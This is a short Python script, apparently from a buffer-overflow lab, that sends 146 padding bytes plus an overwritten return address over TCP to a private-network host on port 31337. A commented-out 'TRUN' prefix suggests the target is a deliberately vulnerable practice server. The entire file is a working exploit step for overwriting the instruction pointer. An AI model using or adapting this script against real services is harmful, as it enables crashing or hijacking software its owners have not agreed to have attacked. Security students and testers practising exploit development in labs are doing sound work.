#!/usr/bin/python3
import sys, socket

# PLACE ADDR HERE -> 

RHOST = '10.0.2.6'
RPORT = 31337

offset = 146
buffer = "A" * offset + "\xC3\x14\x04\x08"
 
try:
    # payload = "TRUN /.:/" + buffer
    # payload = buffer + "\r\n"
    payload = buffer
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((RHOST,RPORT))
    s.send((payload.encode()))
    s.close()
except:
    print ("Error connecting to the server")
    sys.exit()